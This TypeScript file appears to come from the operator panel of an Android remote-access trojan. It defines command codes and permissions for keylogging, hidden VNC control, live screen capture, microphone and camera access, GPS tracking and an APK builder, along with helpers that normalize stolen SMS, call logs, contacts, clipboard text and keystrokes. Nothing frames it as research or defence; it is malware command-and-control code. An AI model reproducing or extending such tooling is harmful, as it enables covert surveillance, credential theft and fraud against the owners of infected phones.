export const CMD = {
  FILES: '0xFI',
  SMS: '0xSM',
  CALLS: '0xCL',
  CONTACTS: '0xCO',
  MIC: '0xMI',
  LOCATION: '0xLO',
  WIFI: '0xWI',
  PERMISSIONS: '0xPM',
  APPS: '0xIN',
  PERM_CHECK: '0xGP',
  CAMERA: '0xCA',
  CLIPBOARD: '0xCB',
  NOTIFICATIONS: '0xNO',
  FASON: '0xFM',
  INFO: '0xIF',
  SCREEN: '0xSC',
  SCREEN_CTRL: '0xST',
  KEYLOGGER: '0xKL',
  WEBRTC_OFFER: '0xWO',
  WEBRTC_ANSWER: '0xWA',
  WEBRTC_ICE: '0xWC',
  HVNC: '0xHV',
  HVNC_CTRL: '0xHC',
  HVNC_OFFER: '0xHO',
  HVNC_ANSWER: '0xHA',
  HVNC_ICE: '0xHI',
} as const;

export type CmdType = typeof CMD[keyof typeof CMD];
export type UserRole = 'admin' | 'user';

export type Permission =
  | 'dashboard:view'
  | 'device:view'
  | 'device:sms'
  | 'device:calls'
  | 'device:contacts'
  | 'device:gps'
  | 'device:camera'
  | 'device:mic'
  | 'device:files'
  | 'device:wifi'
  | 'device:clipboard'
  | 'device:notifications'
  | 'device:permissions'
  | 'device:apps'
  | 'device:fason'
  | 'device:screen'
  | 'device:hvnc'
  | 'device:keylogger'
  | 'device:command'
  | 'device:delete'
  | 'builder:access'
  | 'logs:view'
  | 'logs:clear'
  | 'users:manage'
  | 'settings:view'
  | 'settings:edit'
  | 'stats:view'
  | 'files:download';

export const ALL_PERMISSIONS: Permission[] = [
  'dashboard:view', 'device:view',
  'device:sms', 'device:calls', 'device:contacts', 'device:gps',
  'device:camera', 'device:mic', 'device:files', 'device:wifi',
  'device:clipboard', 'device:notifications', 'device:permissions',
  'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:command', 'device:delete',
  'builder:access', 'logs:view', 'logs:clear', 'users:manage',
  'settings:view', 'settings:edit', 'stats:view', 'files:download',
];

export const DEFAULT_USER_PERMISSIONS: Permission[] = [
  'dashboard:view', 'device:view',
  'device:sms', 'device:calls', 'device:contacts', 'device:gps',
  'device:camera', 'device:mic', 'device:files', 'device:wifi',
  'device:clipboard', 'device:notifications', 'device:permissions',
  'device:apps', 'device:fason', 'device:hvnc', 'device:keylogger', 'device:command',
  'logs:view', 'settings:view',
];

// Matches backend PERMISSION_GROUPS for UI categorization
export const PERMISSION_GROUPS = [
  {
    label: 'Device Features',
    icon: 'Smartphone' as const,
    permissions: [
      { key: 'dashboard:view' as Permission, label: 'View Dashboard', description: 'Access the main dashboard' },
      { key: 'device:view' as Permission, label: 'View Devices', description: 'View device list and basic info' },
      { key: 'device:sms' as Permission, label: 'SMS', description: 'Access SMS messages' },
      { key: 'device:calls' as Permission, label: 'Calls', description: 'Access call logs' },
      { key: 'device:contacts' as Permission, label: 'Contacts', description: 'Access contacts list' },
      { key: 'device:gps' as Permission, label: 'GPS Tracking', description: 'GPS location tracking' },
      { key: 'device:camera' as Permission, label: 'Camera', description: 'Camera capture' },
      { key: 'device:mic' as Permission, label: 'Microphone', description: 'Microphone recording' },
      { key: 'device:files' as Permission, label: 'Files', description: 'File browser access' },
      { key: 'device:wifi' as Permission, label: 'WiFi', description: 'WiFi network data' },
      { key: 'device:clipboard' as Permission, label: 'Clipboard', description: 'Clipboard data' },
      { key: 'device:notifications' as Permission, label: 'Notifications', description: 'Device notifications' },
      { key: 'device:permissions' as Permission, label: 'App Permissions', description: 'View app permissions' },
      { key: 'device:apps' as Permission, label: 'Installed Apps', description: 'View installed applications' },
      { key: 'device:fason' as Permission, label: 'Fason Manager', description: 'Fason app management' },
      { key: 'device:screen' as Permission, label: 'Live Screen', description: 'Live screen streaming and remote control' },
      { key: 'device:hvnc' as Permission, label: 'HVNC', description: 'Hidden virtual display control' },
      { key: 'device:keylogger' as Permission, label: 'Keylogger', description: 'View captured keystroke data' },
      { key: 'device:command' as Permission, label: 'Send Commands', description: 'Send commands to devices' },
      { key: 'device:delete' as Permission, label: 'Delete Devices', description: 'Remove devices and their data' },
    ],
  },
  {
    label: 'System',
    icon: 'Settings' as const,
    permissions: [
      { key: 'builder:access' as Permission, label: 'APK Builder', description: 'Build and download APK files' },
      { key: 'logs:view' as Permission, label: 'View Logs', description: 'View system logs' },
      { key: 'logs:clear' as Permission, label: 'Clear Logs', description: 'Delete all system logs' },
      { key: 'users:manage' as Permission, label: 'Manage Users', description: 'Create, edit, delete users and permissions' },
      { key: 'settings:view' as Permission, label: 'View Settings', description: 'View system configuration' },
      { key: 'settings:edit' as Permission, label: 'Edit Settings', description: 'Modify system configuration' },
      { key: 'stats:view' as Permission, label: 'View Statistics', description: 'Access system statistics' },
      { key: 'files:download' as Permission, label: 'Download Files', description: 'Download photos, recordings, and files from devices' },
    ],
  },
];

// ─── Device Outlet Context ────────────────────────────────────

export interface DeviceOutletContext {
  client: ClientDevice | null;
  clientId: string;
  loadClient: () => void;
  online: boolean;
}

// ─── Core Domain Types ────────────────────────────────────────

export interface ClientDevice {
  id: string; ip: string; country: string | null; city: string | null;
  timezone: string | null; deviceModel: string | null; deviceBrand: string | null;
  deviceVersion: string | null; online: boolean; firstSeen: string; lastSeen: string;
  reconnectCount: number; fasonHidden: boolean; cameraPermission: boolean;
  currentPath: string; gpsInterval: number;
}

export interface DashboardData {
  onlineClients: ClientDevice[]; offlineClients: ClientDevice[];
  stats: { totalClients: number; onlineClients: number; offlineClients: number; totalLogs: number; todayLogs: number; totalUsers: number; totalAdmins: number; uptime: number; memoryUsage: number; };
}

export interface DeviceInfo {
  model?: string; brand?: string; version?: string; sdk?: string;
  battery?: { level: number; charging: boolean; health: string };
  memory?: { total: number; used: number; free: number };
  storage?: { total: number; used: number; free: number };
  network?: { type: string; subtype: string; carrier: string };
  screen?: { width: number; height: number; density: number };
  phone?: { imei: string; number: string; network: string };
}

export interface ClientFile { id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null; }
export interface LogEntry { id: number; type: string; category: string; message: string; details: string | null; created_at: string; }

export interface ServerConfig {
  port: number; debug: boolean;
  limits?: Record<string, unknown>;
  socket: Record<string, unknown>;
  rateLimit: { windowMs: number; maxRequests: number };
  build: { timeout: number };
  security: { sessionTimeout: number; loginAttempts: number; loginLockout: number };
  logger: Record<string, unknown>;
}

export interface ApiResponse<T = unknown> { success: boolean; data?: T; error?: string; message?: string; }

export interface AuthUser {
  id: number;
  username: string;
  email: string;
  role: UserRole;
  permissions: Permission[];
}

export interface UserItem {
  id: number;
  username: string;
  email: string;
  role: UserRole;
  permissions: Permission[];
  isDefault: number;
  createdAt: string;
  lastLogin: string | null;
}

// --- Device Data Type Interfaces (Normalized) ---
// Dual-field properties from backend are normalized here.
// The `extractData` function in each page component maps
// raw backend data to these normalized interfaces.

export interface SmsMessage {
  /** Sender/recipient address (normalized from address|from) */
  address: string;
  /** Message body (normalized from body|message) */
  body: string;
  /** Timestamp string (normalized from date|time) */
  date: string;
  /** SMS type: 1=Received, 2=Sent */
  type: number;
}

export interface CallRecord {
  /** Call type: 1=Incoming, 2=Outgoing, 3=Missed */
  type: number;
  /** Phone number (normalized from number|phone) */
  number: string;
  /** Contact name (normalized from name|cachedName) */
  name: string;
  /** Call duration in seconds */
  duration: number;
  /** Timestamp string (normalized from date|time) */
  date: string;
}

export interface ContactEntry {
  /** Contact name (normalized from name|displayName) */
  name: string;
  /** Phone number (normalized from number|phone) */
  number: string;
  type: string;
}

export interface GpsLocation {
  latitude: number;
  longitude: number;
  accuracy?: number;
  speed?: number;
  provider?: string;
  /** Timestamp (normalized from time|timestamp) */
  time: string;
}

export interface CameraDevice {
  id?: number;
  name?: string;
}

export interface WifiNetwork {
  /** Network name (normalized from ssid|SSID) */
  ssid: string;
  /** Access point MAC (normalized from bssid|BSSID) */
  bssid: string;
  /** Signal level in dBm */
  level?: number;
  /** Security type (normalized from security|capabilities) */
  security: string;
  frequency?: number;
}

export interface ClipboardEntry {
  /** Clipboard text (normalized from text|content) */
  text: string;
  /** Character length */
  length: number;
  label?: string;
  mimeType?: string;
  /** Timestamp (normalized from timestamp|time) */
  timestamp: string;
}

export interface NotificationEntry {
  appName?: string;
  title?: string;
  content?: string;
  timestamp?: string;
  ongoing?: boolean;
  clearable?: boolean;
  category?: string;
  initial?: boolean;
}

export interface PermissionEntry {
  /** Permission name (normalized from permission|name) */
  name: string;
  allowed?: boolean;
}

export interface AppEntry {
  /** App display name (normalized from name|appName) */
  name: string;
  /** Package identifier (normalized from packageName|package) */
  packageName: string;
  /** Whether this is a system app (normalized from systemApp|isSystem) */
  isSystem: boolean;
}

export interface FileEntry {
  name: string;
  /** Whether this is a directory (normalized from isDir|isDirectory) */
  isDir: boolean;
  path: string;
  size?: number;
  lastModified?: number | string;
  date?: string;
}

export interface KeystrokeEntry {
  type: 'live' | 'offline' | 'history';
  eventType?: string;
  pkg?: string;
  cls?: string;
  viewId?: string;
  text?: string;
  extra?: string;
  content?: string;
  timestamp: string;
}

export interface NotificationStatus {
  enabled: boolean;
  connected: boolean;
}

// --- Normalization helpers for extractData ---

/** Safely extract a list from raw API data, with runtime Array check */
export function extractList<T>(raw: unknown): T[] {
  return Array.isArray(raw) ? raw : [];
}

/** Pick first non-null/undefined value from candidates */
export function coalesce(...values: (unknown)[]): string {
  for (const v of values) {
    if (v != null && v !== '') return String(v);
  }
  if (import.meta.env.DEV) {
    console.warn('[normalize] coalesce found no value among:', values);
  }
  return '';
}

/** Normalize raw SMS data from backend */
export function normalizeSmsList(raw: unknown[]): SmsMessage[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      address: coalesce(r.address, r.from),
      body: coalesce(r.body, r.message),
      date: coalesce(r.date, r.time),
      type: typeof r.type === 'number' ? r.type : 0,
    };
  });
}

/** Normalize raw call data from backend */
export function normalizeCallList(raw: unknown[]): CallRecord[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      type: typeof r.type === 'number' ? r.type : 0,
      number: coalesce(r.number, r.phone),
      name: coalesce(r.name, r.cachedName),
      duration: typeof r.duration === 'number' ? r.duration : parseInt(String(r.duration), 10) || 0,
      date: coalesce(r.date, r.time),
    };
  });
}

/** Normalize raw contact data from backend */
export function normalizeContactList(raw: unknown[]): ContactEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      name: coalesce(r.name, r.displayName),
      number: coalesce(r.number, r.phone),
      type: coalesce(r.type),
    };
  });
}

/** Normalize raw WiFi data from backend */
export function normalizeWifiList(raw: unknown[]): WifiNetwork[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      ssid: coalesce(r.ssid, r.SSID),
      bssid: coalesce(r.bssid, r.BSSID),
      level: typeof r.level === 'number' ? r.level : undefined,
      security: coalesce(r.security, r.capabilities),
      frequency: typeof r.frequency === 'number' ? r.frequency : undefined,
    };
  });
}

/** Normalize raw clipboard data from backend */
export function normalizeClipboardList(raw: unknown[]): ClipboardEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      text: coalesce(r.text, r.content),
      length: typeof r.length === 'number' ? r.length : String(r.text || r.content || '').length,
      label: coalesce(r.label) || undefined,
      mimeType: coalesce(r.mimeType) || undefined,
      timestamp: coalesce(r.timestamp, r.time),
    };
  });
}

/** Normalize raw permission data from backend */
export function normalizePermissionList(raw: unknown[]): PermissionEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      name: coalesce(r.permission, r.name),
      allowed: !!r.allowed,
    };
  });
}

/** Normalize raw app data from backend */
export function normalizeAppList(raw: unknown[]): AppEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      name: coalesce(r.name, r.appName),
      packageName: coalesce(r.packageName, r.package),
      isSystem: !!(r.systemApp || r.isSystem),
    };
  });
}

/** Normalize raw keystroke data from backend */
export function normalizeKeystrokeList(raw: unknown[]): KeystrokeEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    // Format timestamp: Android gửi epoch millis (number), backend có thể lưu dạng ISO string
    const tsRaw = r.timestamp ?? r.ts;
    const timestamp = formatTimestamp(tsRaw);
    return {
      type: (r.type === 'offline' ? 'offline' : r.type === 'history' ? 'history' : 'live') as 'live' | 'offline' | 'history',
      eventType: String(r.eventType || ''),
      pkg: String(r.pkg || ''),
      cls: String(r.cls || ''),
      viewId: String(r.viewId || ''),
      text: String(r.txt || r.text || ''),
      extra: String(r.extra || ''),
      content: String(r.content || ''),
      timestamp,
    };
  });
}

/** Format timestamp value (epoch millis number, ISO string, hoặc date string) thành chuỗi ngày giờ đọc được */
function formatTimestamp(value: unknown): string {
  if (value == null || value === '') return '';
  // Nếu là số (epoch millis)
  if (typeof value === 'number') {
    try {
      return new Date(value).toLocaleString();
    } catch {
      return String(value);
    }
  }
  const str = String(value);
  // Nếu là epoch millis dạng string (chỉ chứa số)
  if (/^\d{10,13}$/.test(str)) {
    try {
      const ms = str.length === 10 ? Number(str) * 1000 : Number(str);
      return new Date(ms).toLocaleString();
    } catch {
      return str;
    }
  }
  // Nếu là ISO string hoặc date string khác
  try {
    const d = new Date(str);
    if (!isNaN(d.getTime())) {
      return d.toLocaleString();
    }
  } catch {}
  return str;
}

/** Normalize raw file data from backend */
export function normalizeFileList(raw: unknown[]): FileEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      name: coalesce(r.name),
      isDir: !!(r.isDirectory || r.isDir),
      path: coalesce(r.path),
      size: typeof r.size === 'number' ? r.size : undefined,
      lastModified: r.lastModified as number | string | undefined,
      date: coalesce(r.date) || undefined,
    };
  });
}
